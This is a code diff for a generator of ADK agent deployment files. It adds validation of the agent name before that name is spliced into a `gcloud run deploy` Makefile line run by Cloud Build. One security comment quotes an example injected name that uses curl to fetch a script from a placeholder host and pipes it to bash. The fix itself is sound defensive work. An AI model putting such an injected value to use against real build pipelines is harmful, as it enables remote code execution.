@@ -1,4 +1,5 @@
 import { AdkAgentConfig } from "./types";
+import { assertValidGcpResourceName } from "../shellSafety";
 
 export const generateTestConfigJson = (config: AdkAgentConfig): string => {
   return JSON.stringify(
@@ -71,6 +72,18 @@ export const generateMakefile = (config: AdkAgentConfig): string => {
     config.deploymentTarget === "agent_engine"
       ? "deploy-agent-engine"
       : "deploy-cloud-run";
+  // SECURITY (F-01): `config.name` becomes the Cloud Run service name in the
+  // `gcloud run deploy` line below, and the generated cloudbuild.yaml runs this
+  // Makefile from a `bash -c` step (`make deploy`). A name such as
+  // `x; curl https://untrusted.example.com/s.sh | bash; #` would therefore execute in
+  // Cloud Build. Validate the derived name against the GCP resource-name
+  // allowlist -- every name Cloud Run would actually accept already passes.
+  // An empty name means the builder form is not filled in yet (this template is
+  // regenerated on every keystroke), so only a non-empty name is checked.
+  const cloudRunServiceName = config.name ? config.name.replace(/_/g, "-") : "";
+  if (cloudRunServiceName) {
+    assertValidGcpResourceName(cloudRunServiceName, "Agent name");
+  }
   return `# ADK Makefile
 SHELL := /bin/bash
 
@@ -103,7 +116,7 @@ deploy-agent-engine:
 .PHONY: deploy-cloud-run
 deploy-cloud-run:
 	@echo "Deploying to Cloud Run..."
-	gcloud run deploy ${config.name.replace(/_/g, "-")} --source . --region us-central1 --allow-unauthenticated
+	gcloud run deploy ${cloudRunServiceName} --source . --region us-central1 --allow-unauthenticated
 `;
 };
 
@@ -111,6 +124,18 @@ export const generateCloudBuildYaml = (
   config: AdkAgentConfig,
   projectId: string,
 ): string => {
+  // SECURITY (F-01): the two `bash -c` steps below interpolate nothing directly,
+  // but the second one runs `make deploy`, and the generated Makefile splices the
+  // agent name into `gcloud run deploy`. Validate here as well so this pipeline
+  // cannot be generated for a name that would execute commands in Cloud Build.
+  // Empty is exempt for the same reason as in generateMakefile: the builder
+  // regenerates this preview on every keystroke, starting from an empty name.
+  // `projectId` is deliberately NOT validated -- it is not interpolated into this
+  // template at all, and legacy domain-scoped IDs ("example.com:proj") would fail
+  // the allowlist for no security benefit.
+  if (config.name && config.name.trim()) {
+    assertValidGcpResourceName(config.name.replace(/_/g, "-"), "Agent name");
+  }
   return `steps:
   # Install dependencies and run evaluation
   - name: 'python:3.11'
@@ -517,7 +542,12 @@ elif "GOOGLE_CLOUD_LOCATION" in os.environ:
     del os.environ["GOOGLE_CLOUD_LOCATION"]
 
 logger.info("Creating Agent Engine...")
-
+${config.enableGraphvizRendering ? `
+# Write graphviz installation script dynamically so it gets packaged
+os.makedirs("installation_scripts", exist_ok=True)
+with open("installation_scripts/install_graphviz.sh", "w") as f:
+    f.write("#!/bin/bash\\napt-get update && apt-get install -y graphviz\\n")
+` : ""}
 # Detect extra packages
 extra_packages = []
 for f in os.listdir("."):
